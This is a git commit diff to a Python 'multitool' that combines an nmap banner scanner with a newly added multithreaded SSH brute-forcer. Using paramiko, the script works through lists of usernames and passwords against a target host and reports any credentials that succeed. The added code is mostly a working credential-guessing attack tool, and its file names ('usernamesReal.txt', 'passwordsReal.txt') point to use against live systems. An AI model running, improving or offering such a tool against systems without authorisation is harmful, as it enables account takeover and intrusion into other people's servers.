c04fff1ba79b156a7a132e241ae92c9986eca0cb
LeandroGarza <leandrogarzap@gmail.com>
2024-07-12 11:29:48 -0300

    se agrega codigo de tethread a fussion

--- Fussion/fussion_multitool.py
+++ Fussion/fussion_multitool.py
@@ -1,5 +1,6 @@
 import nmap
-import paramiko, sys, os, socket, termcolor
+import paramiko, sys, os, termcolor
+import threading, time
 
 def scan(target):
     nm = nmap.PortScanner()
@@ -20,15 +21,14 @@ def scan(target):
                 if product_version in vul_banners:
                     print(termcolor.colored(('[!!] VULNERABLE BANNER: "' + product_version + '" ON PORT: ' + str(port)),'red'))
                     
-targets = input('Escriba el dominio o ips a escanear (separados por coma): ')
+targets = input('Escriba el dominio o ip a escanear: ')
 if ',' in targets:
     for ip_add in targets.split(','):
         scan(ip_add.strip(' '))
 else:
     scan(targets)
     
-    
-
+"""
 def ssh_connect(password, code=0):
 
     ssh = paramiko.SSHClient()
@@ -74,4 +74,55 @@ with open(input_file, 'r') as file:
 
         except Exception as e:
             print(e)
-            pass
+            pass         
+"""
+stop_flag = False
+max_threads = 5  # Número máximo de hilos simultáneos
+thread_limiter = threading.BoundedSemaphore(max_threads)
+
+def ssh_connect(username, password):
+    global stop_flag
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        ssh.connect(host, port=22, username=username, password=password)
+        stop_flag = True
+        print(termcolor.colored(('[+] Found Password: ' + password + ', For Account: ' + username), 'green'))
+    except paramiko.ssh_exception.AuthenticationException:
+        print(termcolor.colored(('[-] Incorrect Password: ' + password + ', For Account: ' + username), 'red'))
+    except paramiko.ssh_exception.SSHException as e:
+        print(termcolor.colored(('[-] SSH Exception: ' + str(e)), 'red'))
+    except Exception as e:
+        print(termcolor.colored(('[-] Connection Failed: ' + str(e)), 'red'))
+    finally:
+        ssh.close()
+        thread_limiter.release()
+
+host = targets
+usernames_file = "usernamesReal.txt"
+passwords_file = "passwordsReal.txt"
+print('\n')
+
+if os.path.exists(passwords_file) == False:
+    print('[!!] That File/Path Doesnt Exist')
+    sys.exit(1)
+
+print('Empezando fuerza bruta en host ' + host + ' con el usuario: ' + usernames_file ) 
+
+with open(usernames_file, 'r') as users:
+    for username in users:
+        username = username.strip()
+        with open(passwords_file, 'r') as passwords:
+            for password in passwords:
+                password = password.strip()
+                if stop_flag:
+                    break
+                thread_limiter.acquire()
+                t = threading.Thread(target=ssh_connect, args=(username, password))
+                t.start()
+                time.sleep(0.5)  # Ajusta el tiempo de espera según sea necesario
+                if stop_flag:
+                    break
+        if stop_flag:
+            break
+
